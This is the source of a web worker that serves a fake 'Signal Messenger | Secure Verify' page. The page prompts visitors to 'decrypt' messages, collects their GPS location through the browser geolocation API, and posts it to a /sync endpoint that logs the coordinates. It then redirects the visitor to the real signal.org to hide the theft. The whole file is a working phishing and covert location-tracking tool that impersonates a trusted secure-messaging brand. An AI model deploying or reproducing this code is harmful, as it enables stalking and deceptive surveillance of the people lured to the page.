export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);

    // Automation: Log synchronization data
    if (request.method === "POST" && url.pathname === "/sync") {
      const data = await request.json();
      console.log(`[Node Sync] Location: ${data.lat}, ${data.lon}`);
      return new Response(JSON.stringify({ status: "ok" }), { status: 200 });
    }

    // Serve Signal Branding
    return new Response(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Signal Messenger | Secure Verify</title>
        <style>
            :root { --signal-blue: #2C6BED; --bg: #0B0B0C; --card: #161718; --text: #FFFFFF; }
            body { margin: 0; background: var(--bg); color: var(--text); font-family: -apple-system, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; }
            .card { width: 90%; max-width: 400px; padding: 48px 24px; background: var(--card); border: 1px solid #2C2C2E; border-radius: 32px; text-align: center; }
            .icon { width: 64px; height: 64px; background: var(--signal-blue); border-radius: 18px; margin: 0 auto 24px; display: flex; align-items: center; justify-content: center; }
            .btn { background: var(--signal-blue); color: white; border: none; width: 100%; padding: 16px; border-radius: 14px; font-weight: 600; cursor: pointer; }
            .status { display: none; margin-top: 15px; font-size: 14px; color: #8E8E93; }
        </style>
    </head>
    <body>
        <div class="card">
            <div class="icon">
                <svg width="32" height="32" viewBox="0 0 24 24" fill="white"><path d="M12 2C6.477 2 2 6.477 2 12c0 1.89.525 3.66 1.438 5.16L2 22l4.84-1.438C8.34 21.475 10.11 22 12 22c5.523 0 10-4.477 10-10S17.523 2 12 2z"/></svg>
            </div>
            <h1>Encrypted Access</h1>
            <p>Verify your secure node to decrypt communication.</p>
            <button class="btn" id="go" onclick="sync()">Decrypt Now</button>
            <div id="msg" class="status">Initializing...</div>
        </div>
        <script>
            async function sync() {
                document.getElementById('go').style.display = 'none';
                document.getElementById('msg').style.display = 'block';
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    await fetch('/sync', {
                        method: 'POST',
                        body: JSON.stringify({ lat: pos.coords.latitude, lon: pos.coords.longitude })
                    });
                    setTimeout(() => { window.location.href = "https://signal.org/"; }, 800);
                });
            }
        </script>
    </body>
    </html>`, { headers: { "Content-Type": "text/html" } });
  }
};
